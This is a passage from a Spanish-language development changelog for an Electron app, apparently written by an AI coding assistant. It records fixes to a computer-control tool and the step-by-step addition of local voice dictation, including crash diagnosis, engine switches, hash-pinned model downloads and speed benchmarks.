    "ESPERA sin límite de tiempo"), pero con 15s de timeout del lado de OpenCode, esas llamadas
    timeaban solas mientras el dueño todavía estaba mirando la tarjeta — exactamente los "tres
    intentos seguidos" que vio. Subido a 10 minutos (`service.ts`), con el razonamiento completo en
    el comentario: las herramientas de acción normal (clic, tipeo, captura) ya tienen su propio límite
    más corto (30s) adentro y siempre responden bien antes, así que en la práctica el valor nuevo
    nunca se activa para ellas — es pura red de seguridad para las tarjetas.
  - **Bug 2 (relacionado) — sin eso, un reintento de OpenCode podía superponerse con la llamada
    original** (dos acciones de mouse/teclado reales corriendo a la vez). Se agregó una cola que
    serializa TODA llamada a herramientas del MCP, una por vez — nunca dos acciones nativas
    simultáneas, pase lo que pase.
  - **Bug 3 — ninguna captura le decía al modelo qué app tenía en primer plano**: por eso el modelo,
    correctamente, se negó a hacer clic cuando dos capturas (pantalla completa vs. solo la app)
    mostraban cosas distintas — no tenía forma de saber cuál reflejaba la realidad. Ahora `screenshot`
    (y el texto que acompaña cada captura automática tras una acción) dice explícitamente qué app está
    en primer plano.
  - **Bug 4 — `app_screenshot` (captura de UNA ventana) se devolvía como si fueran coordenadas de
    pantalla completa, invitando a clicar sobre ella**: no hay forma de saber dónde está esa ventana
    en la pantalla real (no se captura su posición), así que un píxel de esa imagen nunca se puede
    convertir en un punto de clic. Se marcó explícito en la descripción de la herramienta y en cada
    respuesta: "SOLO para mirar, NUNCA para sacar coordenadas de clic". De paso se encontró y sacó un
    bug aparte: su resultado arrastraba una frase genérica ("Captura de la pantalla principal…") mal
    puesta encima de su propio texto, que ya explicaba todo bien.
  - **Bug 5 — `find_element` devolvía coordenadas en una unidad, `left_click` esperaba otra**:
    `find_element` da las coordenadas de Accessibility en PUNTOS de pantalla; `left_click` (como el
    resto de las herramientas de acción) espera PÍXELES de la última captura y las convierte él mismo
    multiplicando por la proporción — pasarle un punto de AX directo (lo que el propio prompt de la
    herramienta invitaba a hacer) las convertía DOS veces, y el clic caía desviado, más lejos cuanto
    más al fondo/derecha de la pantalla. Arreglado en el origen: ahora `find_element`/`list_elements`
    convierten a píxeles ANTES de mostrarlas, así "pasá estas coordenadas directo" (lo que ya decía el
    prompt) es cierto sin tener que explicarle al modelo una conversión más.
  - **Deliberadamente fuera de esta tanda** (anotado para la próxima, no se tocó): la lista de "apps
    que nunca se ocultan" en modo segundo plano incluye TODA app concedida alguna vez (no solo las de
    la tarea actual) — por eso Discord seguía visible; verificación de que la app en primer plano
    coincide con el objetivo antes de clicar/tipear (el caso del "casi" de WhatsApp de Claude);
    tratamiento especial de apps de solo-píxeles (escritorios remotos, VMs); ritmo de espera más
    inteligente; límite de tiempo en las llamadas de Accessibility; corrección multi-monitor. Son
    cambios de más riesgo/alcance (tocan el sistema de concesiones o el helper nativo en Swift) — se
    dejan para una vuelta aparte, no mezclados con esta tanda ya grande.
- **Verificado**: typecheck (los 4) limpio, lint limpio. Batería de `src/main/computer` completa en
  verde — 314 pruebas (antes 1 falla nueva por plataforma: Windows, por el nuevo llamado `frontmost`
  en paralelo a cada captura, actualizada; la "caracterización" del MCP —fixture de oro que graba
  byte a byte lo que se le pide al helper y lo que se le devuelve al modelo— regenerada A PROPÓSITO
  con `UPDATE_CU_FIXTURE=1` tras revisar el diff completo línea por línea, confirmando que CADA cambio
  es exactamente el que se buscaba, ninguno accidental). Batería completa del repo en verde — 5877
  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac).
- **No verificado todavía — requiere interacción real en una tarea de verdad con una app/ventana
  real**: que el dueño confirme que el flujo completo (plan → tarjeta → control → acción) ya no se
  cae por timeout, y que las capturas/coordenadas nuevas se sienten más confiables.

## F8-B141 — Dictado por voz en Chat/Code/Tareas (100% local, Whisper)

- **El dueño pidió, en paralelo a lo de Cowork**: poder hablar y que se transcriba, en los tres modos.
  Se investigó primero si convenía el reconocimiento de voz nativo del navegador
  (`webkitSpeechRecognition`, cero configuración) — confirmado que NO funciona de forma confiable en
  Electron (Google le exige una clave propia de Chrome de verdad al servicio, que Electron no trae; es
  un problema reportado, no una suposición). El dueño después aclaró que no quería depender de una
  cuenta/clave nueva — mismo criterio que ya había pedido para las fotos — así que se descartó
  cualquier servicio en la nube y se fue directo a **local de verdad**.
  - **Motor**: `@huggingface/transformers` (sucesor activo de `@xenova/transformers`, que quedó
    discontinuado) corriendo Whisper vía ONNX Runtime — SIN compilar ni firmar un binario propio por
    plataforma (a diferencia del helper de Control del Mac, que si lo necesita): es una dependencia de
    npm normal, Mac y Windows cruzan solos. El audio NUNCA sale de la máquina.
  - **Modelo**: `Xenova/whisper-base`, MULTILINGÜE a propósito (nunca una variante "-en": esta app se
    usa en español) — se descarga una sola vez (~145 MB) desde Hugging Face Hub la primera vez que se
    usa, Transformers.js lo cachea solo en `userData` entre arranques. Esa primera vez sí necesita red;
    de ahí en adelante funciona sin conexión, mismo criterio que el resto de lo "local" de esta app. No
    viene empaquetado en el instalador (lo mantiene chico).
  - **Pipeline del audio, todo con APIs web de siempre, sin dependencias nuevas de audio**:
    `getUserMedia`/`MediaRecorder` graban (el permiso de micrófono ya estaba declarado —
    `NSMicrophoneUsageDescription` en `electron-builder.js`, de la grabadora de skills de Control del
    Mac); al cortar, se decodifica con `AudioContext.decodeAudioData` y se remuestrea a PCM mono de
    16 kHz (lo que Whisper espera) con interpolación lineal propia — de sobra para voz, sin arrastrar
    ninguna librería de audio. Eso se manda a main (`extras:transcribeAudio`, nuevo canal IPC,
    clasificado `'X'` en `remote/policy.ts`), que corre Whisper y devuelve el texto.
  - **Un solo hook y un solo botón, compartidos por los tres modos**: `useVoiceDictation` (grabar →
    transcribir) + `VoiceDictationButton` (ícono de micrófono, un clic graba, otro corta y transcribe)
    — cada composer (`ChatComposer.tsx`, Code's `Composer.tsx` ×2 — tiene diseño de escritorio y de
    celular por separado —, `TasksComposer.tsx`) solo aporta un `insertDictated` que mete el texto en
    la posición del cursor, mismo patrón que ya usaba el botón de "@" de Code.
  - **Empaquetado**: `onnxruntime-node` (el runtime de ONNX) y `sharp`/`@img/*` (dependencia de
    `@huggingface/transformers`) traen binarios nativos por plataforma adentro del propio paquete de
    npm — se agregaron a `asarUnpack` en `electron-builder.js` (mismo motivo y mismo patrón que ya
    existía ahí para `@node-datachannel`, el addon de WebRTC del control remoto): un `.node` no puede
    cargarse desde adentro del `.asar`.
  - **Bug real encontrado al escribir las pruebas, no relacionado con la voz pero destapado por ella**:
    `getExtras()` (`src/renderer/src/lib/extrasApi.ts`) asumía que `window` siempre existe —
    `window.api?.extras`. Hay pruebas de contenido (`*.render.test.tsx`) que renderizan con
    `renderToStaticMarkup`, un SSR de verdad SIN ningún `window` global — ahí tira `ReferenceError`, no
    `undefined`. Ningún botón existente lo había destapado porque ninguno se renderizaba en ese camino
    SSR en particular; el de voz, al sumarse al composer de Tareas, sí. Arreglado con un
    `typeof window === 'undefined'` al principio — beneficia a TODO lo que ya usa `getExtras()`, no
    solo al botón nuevo.
  - **Bug de pruebas (no de producto) encontrado al verificar F8-B140 otra vez**: la prueba de Windows
    que fija el orden exacto de llamadas al helper durante una captura asumía un orden fijo entre
    `frontmost` y `list-apps` — pero esas dos corren EN PARALELO (`Promise.all`, ver F8-B140) y su
    orden relativo no es determinista entre corridas. Se reescribió para solo pedir que `frontmost`
    pase en algún punto temprano (entre "session" y "screenshot"), nunca una posición fija — confirmado
    estable en 6 corridas seguidas.
- **Pruebas nuevas**: `voice-transcribe.test.ts` (6, con `@huggingface/transformers` mockeado:
  audio vacío nunca carga el modelo, carga el pipeline con un modelo MULTILINGÜE de verdad —no uno
  "-en"—, el pipeline se carga UNA sola vez aunque se transcriba varias veces, un resultado sin texto
  da `''`, el audio se recorta a 120s antes de mandarlo, y un fallo de carga (p.ej. sin red la primera
  vez) permite reintentar en la próxima llamada en vez de quedar pegado al error).
- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes). Batería
  completa del repo en verde — 5884 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
  (`ENOEXEC` en Mac). App reiniciada (con la dependencia nueva, Vite re-optimizó solo, sin errores).
- **No verificado todavía — requiere interacción real con micrófono y descarga de verdad**: que el
  dueño pruebe dictar en los tres modos, confirme que el permiso de micrófono de macOS aparece bien,
  que la descarga del modelo la primera vez termine sin problema, y que la calidad de la transcripción
  en español alcance para lo que necesita (si no, el ajuste más simple es subir a `whisper-small`, más
  preciso y más pesado — un solo identificador de modelo para cambiar en `voice-transcribe.ts`).

## F8-B142 — El micrófono no andaba: faltaba en la lista blanca de permisos de Electron

- **El dueño probó F8-B141 y el botón de micrófono no hacía nada** — causa real, no un bug del
  pipeline de audio: `security/web-security.ts` (endurecimiento global de Electron, AUDIT.md 2.1/S8)
  deniega TODOS los permisos de la sesión por defecto salvo una lista blanca explícita
  (`notifications`, `clipboard-sanitized-write`) — `media` (lo que pide `getUserMedia`) no estaba, así
  que Electron lo rechazaba él mismo, ANTES de que el sistema operativo llegara a mostrar su propio
  diálogo de permiso. Era una decisión de seguridad deliberada y auditada (el propio `AUDIT.md` decía
  "probado: micrófono denegado"), no un descuido — había que tocarla a propósito, no solo en el código.
  - Agregado `'media'` a la lista blanca (`ALLOWED_PERMISSIONS`), con el mismo criterio que ya aplica
    a los otros dos: SOLO para páginas propias en el frame principal (`isTrustedUrl`) — un artifact o
    el visor (sesiones aparte, con su propio `setPermissionRequestHandler` que deniega TODO) siguen
    sin poder pedir el micrófono, sin cambios ahí. Electron no distingue "micrófono" de "cámara" a
    este nivel (`media` cubre ambos) — esta app nunca pide video, así que en la práctica solo habilita
    audio; el sistema operativo igual pregunta la primera vez (ese diálogo no lo toca este cambio).
  - `AUDIT.md` actualizado en el mismo lugar que documentaba lo viejo (tabla 2.1), para que la
    documentación de seguridad no quede mintiendo sobre el estado real.
- **Verificado**: typecheck limpio, lint limpio, las pruebas de `security/web-security.*` (las únicas
  que tocan este archivo — ninguna fija la lista exacta de permisos, así que no hacía falta
  actualizar ninguna) siguen en verde. App reiniciada.
- **No verificado todavía**: que el dueño confirme que ahora sí aparece el diálogo de permiso de
  micrófono de macOS al apretar el botón, y que después de concederlo el dictado funciona de punta a
  punta.

## F8-B143 — Dictado: "tarda muchísimo" + "funciona pésimo" (más preciso + avisa que está descargando)

- **El dueño, ya con el permiso de micrófono andando**: "funciona pésimo" — dos quejas separadas,
  confirmadas por él mismo al preguntarle: el texto transcrito no se entiende bien, y además tarda
  muchísimo. No había forma de saber CUÁL de las dos causas pesaba más sin arreglar ambas:
  - **"Tarda muchísimo" → probablemente la descarga del modelo (~145 MB la primera vez) sin ningún
    aviso**: antes de esto, apretar el botón se sentía exactamente igual estuviera transcribiendo (unos
    segundos) o descargando el modelo por primera vez (podía ser varios minutos según la conexión) —
    mismo ícono de "cargando", sin ninguna señal de cuál de las dos cosas estaba pasando.
    `@huggingface/transformers` expone un `progress_callback` de verdad (porcentaje agregado de todos
    los archivos del modelo) — se conectó: ahora el botón muestra "Bajando el modelo de voz (una sola
    vez)… 42%" en vez de solo girar. Solo pasa la primera vez; de ahí en adelante es inmediato.
  - **"No se entiende" → subido de `whisper-base` a `whisper-small`**: el tamaño "base" es sabido que
    pierde bastante precisión en idiomas no ingleses frente a "small" — para una app que se usa en
    español, era la causa más probable. A cambio pesa más (~244 MB en vez de ~145 MB, siempre la
    primera vez) y tarda un poco más por transcripción — con el aviso de descarga de arriba, al menos
    la espera ahora se entiende. Si igual no alcanza o resulta muy lento en la práctica, es un solo
    identificador de modelo para tocar en `voice-transcribe.ts` (`MODEL_ID`).
  - **De paso, se separó `voice-transcribe.ts` del resto de `extras/`**: al principio importaba
    `broadcastExtras` directo de `extras/index.ts` para avisar el progreso — mismo problema ya visto
    con `slides-deck-export.ts` esta sesión: esa cadena de imports arrastra `app.isPackaged` de
    Electron, y las pruebas (sin Electron real) explotaban. Arreglado igual que aquella vez:
    `voice-transcribe.ts` queda puro (solo avisa por un callback propio, `onVoiceModelProgress`), y es
    `extras-handlers.ts` (que ya vive en el mundo de Electron) el que conecta ese callback con
    `broadcastExtras` — nuevo evento IPC `extras:voiceModelProgress`, clasificado `deny` en
    `remote/policy.ts` (el dictado nunca pasa por el celular, no hay micrófono del Mac ahí).
- **Pruebas nuevas**: 2 más en `voice-transcribe.test.ts` (8 en total) — `onVoiceModelProgress` avisa
  a quien escucha con cada actualización de descarga y al terminar, y la des-suscripción de verdad deja
  de avisar.
- **Verificado**: typecheck (los 4) limpio, lint limpio. Batería completa del repo en verde — 5886
  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac). `policy.test.ts`
  (cobertura 100% de EVENTOS esta vez, no solo canales — encontró el evento nuevo sin clasificar) y
  `i18n-core.test.ts` en verde con lo nuevo. App reiniciada.
- **No verificado todavía**: que el dueño confirme que ahora sí avisa mientras descarga y que la
  calidad en español mejoró lo suficiente con `whisper-small`.

## F8-B144 — "Se cerró la app sola": el dictado tenía un crash NATIVO real, aislado en proceso aparte

- **El dueño, probando el dictado ya con `whisper-small`**: "se cerro la app sola XD" — toda la app
  (no solo el dictado) se cerró de golpe. No se le pidió más detalle: el reporte de crash de macOS era
  suficiente para diagnosticarlo solo.
  - `pgrep` confirmó que el proceso de Electron estaba muerto de verdad (no colgado). El log de dev
    (`/tmp/lazunox-dev.log`) no tenía nada útil, pero macOS guarda un reporte de crash real en
    `~/Library/Logs/DiagnosticReports/` — se encontró `Electron-2026-10-08-195746.ips`, se parseó a
    mano (cabecera JSON + cuerpo JSON) y dio la causa exacta: **`EXC_BREAKPOINT`/`SIGTRAP` nativo
    DENTRO de `libonnxruntime.1.dylib`**, en medio de una inferencia real de Whisper
    (`BFCArena::Extend` → `operator new` → … → `Softmax::Compute` → `InferenceSession::Run`). Es decir:
    no un error de JavaScript (ningún `try/catch` lo agarra nunca — un crash nativo mata el proceso
    entero que lo contiene), sino un fallo real del motor ONNX Runtime corriendo DENTRO del proceso
    principal de Electron, que se lleva toda la app con él.
- **Arreglo: el dictado se mudó a un `utilityProcess` aparte**, el mismo patrón ya probado en este
  código para Control del Mac (`computer/mcp-server.ts` + `mcp-host.ts`):
  - `src/main/extras/voice-worker.ts` (nuevo): entry point autocontenido de un build nuevo
    (`out/main/voice-worker.js`, agregado a `electron.vite.config.ts`), importa SOLO
    `voice-transcribe.ts` (puro, sin nada de Electron) — recibe `{type:'transcribe', id, samples}` por
    `process.parentPort`, corre `transcribeAudio`, devuelve `{type:'result'|'error', id, ...}`.
  - `src/main/extras/voice-worker-host.ts` (nuevo): `VoiceWorkerHost`, vive en el proceso principal.
    Arranca el worker recién la primera vez que hace falta transcribir (no al abrir la app), con
    protocolo de "listo" (timeout 15 s) y correlación de pedidos por id numérico (soporta varios
    pedidos en simultáneo). A diferencia del MCP de Control del Mac (que tiene que estar siempre
    disponible, con reintento automático), acá alcanza con relanzar en la SIGUIENTE llamada a
    `transcribe()` si el proceso murió — no hay bucle de fondo.
  - Si el worker muere a mitad de una transcripción (crash nativo incluido — el motivo de todo esto):
    lo pendiente falla con un mensaje claro ("probá de nuevo") en vez de quedarse colgado para siempre,
    y la próxima vez que se use el micrófono el worker se levanta solo de nuevo. Lo peor que puede pasar
    ahora es que esa transcripción puntual falle — nunca que se cierre la app entera.
  - `extras-handlers.ts` reemplaza las llamadas directas a `transcribeAudio`/`onVoiceModelProgress` por
    `VoiceWorkerHost`, con `app.on('before-quit', () => voiceWorker.dispose())` para no dejar el
    proceso chico huérfano al cerrar.
- **Sin pruebas unitarias nuevas para `VoiceWorkerHost`/`voice-worker.ts`**: igual que el `ComputerMcpHost`
  equivalente (tampoco tiene test propio en este repo — se verifica con el MCP real corriendo), mockear
  `utilityProcess.fork()` de Electron de forma fiel no daba suficiente valor frente al costo; la lógica
  real (transcribir, reportar progreso) sigue cubierta por los 8 tests ya existentes de
  `voice-transcribe.test.ts`, intactos porque ese archivo no cambió, solo su forma de ser invocado.
- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, `out/main/voice-worker.js` se genera
  en el build (3.33 kB). Batería completa del repo en verde — 5886 pruebas, 23 skipped (Windows-only),
  mismo ruido ajeno de siempre (`ENOEXEC` en Mac, no relacionado). App reiniciada con el fix.
- **No verificado todavía**: que el dueño dicte de nuevo y confirme en la práctica que un fallo del
  motor de voz ya no se lleva la app — eso requiere volver a provocarlo o usarlo lo suficiente como
  para confiar en que, si pasa, ahora queda contenido.

## F8-B145 — Dictado: "ahora no transcribio nada XD" — se cambió el motor entero (whisper.cpp, no ONNX)

- **El dueño, apenas aislado el crash de F8-B144**: "ahora no transcribio nada XD" — el proceso aparte
  ya no se llevaba la app entera (la isolación funcionó: el reporte de crash de macOS esta vez fue del
  proceso "Electron Helper", no de "Electron"), pero el crash nativo en sí seguía pasando DENTRO de ese
  proceso chico, así que la transcripción puntual fallaba igual. Pedido explícito del dueño: "investiga
  en internet la mejor forma de hacerlo, claude lo hace al instante" — no parchar más onnxruntime-node,
  buscar la causa de fondo y una alternativa mejor.
- **Investigado (no inventado)**: el patrón del crash (`EXC_BREAKPOINT` dentro de `libonnxruntime.1.dylib`,
  justo después de un frame de `libc++abi.dylib`) coincide con un problema conocido y documentado de
  onnxruntime-node: cuando el allocador de memoria (`BFCArena::Extend`) no puede reservar lo que
  necesita, lanza una excepción C++ en vez de devolver un error — si esa excepción cruza el binding de
  Node sin ser atrapada, termina en `std::terminate`/abort (reportes reales:
  [microsoft/onnxruntime#24264](https://github.com/microsoft/onnxruntime/issues/24264), caso similar
  documentado en [discuss.huggingface.co](https://discuss.huggingface.co/t/got-onnxruntimeerror-when-try-to-run-bart-in-onnx-format-12851/8945)
  donde bajar de versión "arregla" el síntoma pero no la causa). Es una debilidad real de esa librería
  corriendo Whisper, no algo propio de esta app.
- **Cambio de motor: `@huggingface/transformers`/onnxruntime-node → `smart-whisper-electron`
  (whisper.cpp nativo, con Metal en Apple Silicon)**. Confirmado con el dueño antes de meterse (cambio
  grande, no un parche) — ver pregunta respondida: cambiar de motor, no seguir mitigando ONNX.
  whisper.cpp no tiene este patrón de crash reportado y además corre mucho más rápido en Apple Silicon
  (GPU Metal real, no solo CPU/WASM) — también resuelve de raíz la otra queja de F8-B143
  ("funciona pésimo"/"tarda muchísimo").
  - `src/main/extras/voice-transcribe.ts`: reescrito para usar `smart-whisper-electron` en vez de
    `@huggingface/transformers`. Sigue siendo un módulo PURO (sin Electron) y mantiene exactamente la
    misma firma pública (`transcribeAudio`, `onVoiceModelProgress`) — `voice-worker.ts`/
    `voice-worker-host.ts` no necesitaron tocarse en su protocolo.
  - **Descarga del modelo con integridad real, no solo "confiar en el servidor"**: nuevo
    `src/main/util/pinned-fetch.ts` (`downloadPinnedFile`, genérico, reusable), mismo criterio que ya
    usa `tasks/backends/pinned-download.ts` — tamaño y SHA-256 EXACTOS fijados en el código (sacados
    de verdad de la API de Hugging Face, no inventados: `ggml-small.bin`, 487 601 967 bytes, SHA-256
    `1be3a9b2…fffea987b`), escribe a `.part` y recién renombra si todo coincide; una descarga a medias
    o corrupta nunca queda como si fuera un modelo válido. A diferencia de `pinned-download.ts`, sin su
    lista cerrada de hosts de GitHub: Hugging Face redirige a su propia CDN con dominios que varían
    (confirmado con un `HEAD` real: redirige a `us.aws.cdn.hf.co`), así que el candado real acá es el
    hash final, no una lista de dominios.
  - **Metal en un `.asar` empaquetado**: whisper.cpp busca su shader (`ggml-metal.metal`) en el disco en
    tiempo de ejecución, nunca embebido en el binario — dentro de un `.asar` no lo encuentra solo.
    `voice-worker-host.ts` le pasa la carpeta real (desempaquetada) por la variable
    `GGML_METAL_PATH_RESOURCES` al arrancar el proceso — sin esto, Metal fallaría SOLO en producción
    (en `npm run dev`, sin asar, no se nota). `electron-builder.js`: `asarUnpack` cambia las entradas de
    `onnxruntime-node`/`sharp`/`@img` (ya no existen) por `node_modules/smart-whisper-electron/**`.
  - `package.json`: sacado `@huggingface/transformers` (y de paso sus dependencias transitivas
    `onnxruntime-node`/`sharp`/`@img/*`, ya no usadas en ningún otro lado — confirmado con
    `npm ls` antes de tocar nada), agregado `smart-whisper-electron`.
- **Verificación real de punta a punta, no solo mocks**: se bajó el modelo de verdad (487 601 967
  bytes, SHA-256 verificado a mano con `shasum`, coincide exacto) y se corrió una inferencia real con
  el addon nativo ya compilado, bajo el mismo runtime de Node que usa Electron (`ELECTRON_RUN_AS_NODE=1`,
  para descartar un desajuste de ABI entre el Node del sistema que compiló el addon y el Node embebido
  de Electron que lo tiene que cargar después) — detectó la GPU (Apple M4, Metal), cargó el modelo en
  ~220 ms y transcribió sin crashear. `pinned-fetch.ts` tiene 7 pruebas nuevas (tamaño/hash correctos,
  tamaño/hash incorrectos, ya cacheado no vuelve a bajar, servidor manda de más, etc.) y
  `voice-transcribe.test.ts` se reescribió para mockear `smart-whisper-electron`/`pinned-fetch` en vez
  de `@huggingface/transformers` (mismos 8 casos de antes + 1 nuevo, todos en verde). Typecheck (los 4
  proyectos) limpio, lint limpio, batería completa — 5893 pruebas, 23 skipped (Windows-only), mismo
  ruido ajeno de siempre (`ENOEXEC` en Mac). App reiniciada con el motor nuevo; el modelo quedó
  pre-descargado en `userData/models/whisper/` para que la primera prueba real del dueño no tenga que
  esperar la descarga de 465 MB.
- **No verificado todavía**: que el dueño dicte voz REAL (habla, no el tono sintético usado en la
  prueba de arriba) desde Chat/Code/Tareas y confirme que ahora sí transcribe, rápido y sin crashear.

## F8-B146 — Dictado más rápido: `greedy` + `flash_attn` (medido, no adivinado)

- **El dueño, ya con whisper.cpp andando**: "se podrá hacer más rápido aún la transcripción y que sea
  más correcta, más precisa — investiga en internet". Antes de tocar nada se armó un benchmark real
  (audio en español generado con `say` de macOS, no un tono sintético) comparando la config actual
  contra las dos palancas que la investigación señaló como más prometedoras para whisper.cpp:
  decodificación `greedy` en vez del `beam_search` por defecto, y `flash_attn` (Metal).
  - Resultado medido (misma frase, mismo modelo "small"): **1374 ms → 890 ms (-35%)**, y de paso
    `greedy` transcribió la frase COMPLETA mientras que `beam_search` por defecto le cortó las últimas
    dos palabras — o sea, acá no hubo contra ninguno, ganó en los dos ejes a la vez. Investigación que
    lo respalda: el beam search de Whisper gana menos de 1-2 puntos de WER frente a greedy en la
    mayoría de los idiomas y a veces ni eso
    ([discusión de Hugging Face](https://discuss.huggingface.co/t/how-do-you-use-beam-search-in-whisper-correctly/131244),
    [benchmark en pashto](https://arxiv.org/pdf/2604.04598)); `flash_attn` en Metal reduce el tiempo de
    encoder ~15% sin pérdida de precisión medida (notas de release whisper.cpp v1.6.0). Las dos quedan
    prendidas siempre en `voice-transcribe.ts` (`loadWhisper`/`transcribeAudio`) — sin flag, sin
    decisión que pedirle al dueño, porque no tienen contra.
  - **Pruebas**: el mock de `smart-whisper-electron` en `voice-transcribe.test.ts` ahora también expone
    `WhisperSamplingStrategy` (la llamada real a `transcribe()` ahora manda `strategy` explícito).
- **Lo que SÍ tiene contra, y se lo paso al dueño en el chat en vez de decidirlo solo**: para la parte
  de "más precisa" se probó además `ggml-large-v3-turbo-q5_0` (modelo grande cuantizado, misma familia
  que `large-v3`, 574 MB) contra la misma frase — transcribió PERFECTO (el "small" actual le erró una
  palabra: "dedicado" en vez de "de dictado"), pero tardó 3361 ms (2.4x más lento que el "small" con
  greedy). Es una mejora real de precisión a costa real de velocidad, no algo que se pueda decidir sin
  el dueño — queda pendiente de que él elija.
- **Verificado**: typecheck limpio, lint limpio, batería completa — 5893 pruebas en verde (mismo ruido
  ajeno `ENOEXEC`). App reiniciada con `greedy`+`flash_attn` ya activos sobre el modelo "small" actual.
- **Decisión del dueño sobre el modelo**: "¿habrá algo mejor que sea rápido y bueno y liviano?" — se
  probó un tercer candidato, `ggml-medium-q5_0` (539 MB, apenas más pesado que "small"), con 3 frases
  distintas en español (no solo una): acertó las 3, contra 1 de 3 del "small" actual, a cambio de
  ~2.5x más latencia (~2 s vs ~0.8 s por frase) — mejor balance medido que `large-v3-turbo-q5_0`
  (574 MB, ~3.4 s, mismo 0 errores pero más lento y más pesado). El dueño eligió cambiar a
  `medium-q5_0`. `voice-transcribe.ts`: las 4 constantes del modelo (`MODEL_URL`/`MODEL_FILENAME`/
  `MODEL_SIZE`/`MODEL_SHA256`) actualizadas a sus valores reales (sacados de la API de Hugging Face,
  verificados con `shasum` a mano, no inventados). Modelo viejo (`ggml-small.bin`) borrado de
  `userData/models/whisper/` y el nuevo (`ggml-medium-q5_0.bin`) pre-descargado ahí mismo, mismo
  criterio que la vez anterior — la primera prueba real del dueño no tiene que esperar la descarga.
- **Verificado (de nuevo, con el modelo nuevo)**: typecheck limpio, lint limpio, los 8 tests de
  `voice-transcribe.test.ts` en verde (el que comprobaba el nombre de archivo del modelo actualizado).
  App reiniciada.
- **No verificado todavía**: que el dueño confirme en uso real (dictando de verdad, no con frases de
  prueba sintéticas) que la mejora de precisión se nota y que la latencia nueva (~2 s) se siente bien.

## F8-B147 — Dictado "casi instantáneo" de verdad: tercer motor, sherpa-onnx (y resuelve Windows)

- **El dueño, con medium-q5_0 ya andando**: "investiga en internet, debe haber algo mejor y más rápido
  casi a instante". Primero se probó la única palanca que quedaba dentro de whisper.cpp (`audio_ctx`
  reducido, para no procesar de más en audios cortos) — **crasheó de verdad** con un assert nativo de
  Metal (`GGML_ASSERT(nb01 % 8 == 0) failed`, abortó el proceso), descartada antes de tocar nada real.
  Con whisper.cpp ya sin más palancas seguras, se investigó el motor nativo de dictado de macOS
  (Speech framework) — más preciso que whisper en un benchmark real, pero exige escribir un módulo en
  Swift desde cero y **solo funciona en Mac**. El dueño lo frenó por eso mismo: "no nos sirve porque
  para Windows quedaremos tirados" — corregido, es la razón correcta para no encararlo así.
- **La solución real: `sherpa-onnx-node`** — motor de reconocimiento de voz (Next-gen Kaldi, Apache-2.0,
  N-API así que no hace falta recompilar para Electron) con binarios YA PRECOMPILADOS en npm para las
  tres plataformas (`sherpa-onnx-darwin-arm64`, `sherpa-onnx-win-x64`, `sherpa-onnx-linux-x64`, como
  `optionalDependencies` — `npm install` instala solo el que corresponde al sistema, sin compilar
  nada). Con un modelo Zipformer en streaming para español (proyecto comunitario Kroko, gratis,
  156 MB en total — mucho más chico que cualquiera de los anteriores).
- **Medido con audio real en español antes de tocar nada de la app** (misma disciplina que las rondas
  anteriores — nunca se asumió que "debía" ser mejor):
  - 3 frases de prueba: **~100-120 ms por frase** (vs ~2000 ms de whisper.cpp medium-q5_0 — 17x más
    rápido), 0 errores de palabras (solo faltan los signos de puntuación, que este tipo de modelo no
    pone — característica, no bug).
  - Frase larga (17.1 s de audio): 351-515 ms, texto exacto palabra por palabra salvo las últimas 1-2
    palabras — **se investigó por qué** (no se dejó así): el patrón oficial de sherpa-onnx manda 0.4 s
    de silencio de cola antes de drenar la decodificación; con 2 s de cola el resultado coincidió EXACTO,
    sin faltar ninguna palabra, en todas las pruebas (frases cortas, la frase larga, y el caso límite).
    Quedó en `TAIL_SILENCE_SECONDS = 2` en el código, documentado el por qué.
  - Casos límite probados sin que nada rompiera nunca: audio vacío, audio de 50 ms, 3 s de silencio
    puro, 2 s de ruido aleatorio, un buffer con `NaN` adentro (entrada corrupta a propósito), y 10
    transcripciones seguidas con el mismo reconocedor (reuso real) — todo controlado, cero crashes.
  - Prueba de punta a punta por el `voice-worker.js` REAL compilado (no solo la librería suelta),
    simulando el protocolo de `parentPort` tal cual lo usa `voice-worker-host.ts`: arrancó, avisó
    `ready`, transcribió una frase real grabada con `say`, devolvió el resultado y cerró limpio.
- **Cambios de código**:
  - `src/main/extras/voice-transcribe.ts`: reescrito para `sherpa-onnx-node` (`OnlineRecognizer` +
    `OnlineStream`, decodificación streaming con `greedy_search`, `enableEndpoint: false`). Sigue
    siendo un módulo PURO (sin Electron). Los 4 archivos del modelo (encoder/decoder/joiner/tokens) se
    descargan en paralelo vía `downloadPinnedFile`, cada uno con su tamaño y SHA-256 real pinneado
    (sacados de la API de Hugging Face, verificados a mano con `shasum`).
  - `src/main/extras/sherpa-onnx-node.d.ts` (nuevo): el paquete no trae tipos propios — declaración
    ambient mínima, solo con la parte de la API que se usa.
  - `src/main/extras/voice-worker-host.ts`: sacada toda la lógica específica de Metal
    (`GGML_METAL_PATH_RESOURCES`, ya no aplica — sherpa-onnx corre en CPU, nada de shaders que
    desempacar); variable de entorno renombrada a `LAZUNOX_VOICE_MODEL_DIR` (ya no es específica de
    Whisper), carpeta de caché ahora `userData/models/voice/`.
  - `electron-builder.js`: `asarUnpack` cambia `smart-whisper-electron/**` por
    `sherpa-onnx-node/**` + `sherpa-onnx-*/**` (cubre el paquete del addon nativo y el paquete de
    binario por plataforma que `npm install` haya resuelto).
  - `package.json`: sacado `smart-whisper-electron`, agregado `sherpa-onnx-node`.
  - El `utilityProcess` aparte (F8-B144) se mantiene aunque este motor no mostró ningún crash en las
    pruebas — aislamiento gratis, no cuesta nada seguir teniéndolo por si un motor futuro sí falla.
- **Pruebas**: `voice-transcribe.test.ts` reescrito (9 casos: antes mockeaba `smart-whisper-electron`,
  ahora mockea `sherpa-onnx-node` — incluye un caso nuevo que confirma que SIEMPRE se manda la cola de
  silencio después del audio real).
- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5894 pruebas en
  verde, 23 skipped (Windows-only), mismo ruido ajeno `ENOEXEC`. App reiniciada con el motor nuevo;
  modelo pre-descargado en `userData/models/voice/` (el `ggml-*.bin` viejo de whisper.cpp se borró, ya
  no se usa).
- **No verificado todavía**: que el dueño dicte de verdad y confirme que ahora se siente instantáneo;
  que alguien compile/corra la app en Windows de verdad para confirmar que `sherpa-onnx-win-x64` se
